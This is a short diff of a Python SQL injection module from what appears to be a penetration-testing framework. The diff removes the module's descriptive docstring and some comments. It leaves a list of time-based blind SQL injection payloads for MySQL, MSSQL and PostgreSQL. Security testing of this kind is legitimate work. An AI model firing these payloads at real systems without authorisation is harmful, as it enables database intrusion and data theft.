@@ -1,16 +1,3 @@
-"""
-modules/vuln/sqli.py — Módulo de SQL Injection
-CEH Framework
-
-Capas:
-  1. Detección manual (Python puro, sin tools externas)
-     - Error-based detection
-     - Boolean-based blind detection
-     - Time-based blind detection
-     - Análisis de headers y respuestas
-  2. Explotación con SQLMap (si está instalado)
-     - 6 perfiles: Detect, Enumerate DBs, Dump Tables, Full Dump, WAF Bypass, Custom
-"""
 import re
 import time
 import urllib.request
@@ -61,8 +48,8 @@ BOOLEAN_PAIRS = [
 TIME_PAYLOADS = [
     "'; SELECT SLEEP(4)--",
     "' AND SLEEP(4)--",
-    "1; WAITFOR DELAY '0:0:4'--",       # MSSQL
-    "'; SELECT pg_sleep(4)--",           # PostgreSQL
+    "1; WAITFOR DELAY '0:0:4'--",      
+    "'; SELECT pg_sleep(4)--",           
     "' AND 1=1 AND SLEEP(4)--",
     "' OR SLEEP(4)--",
 ]
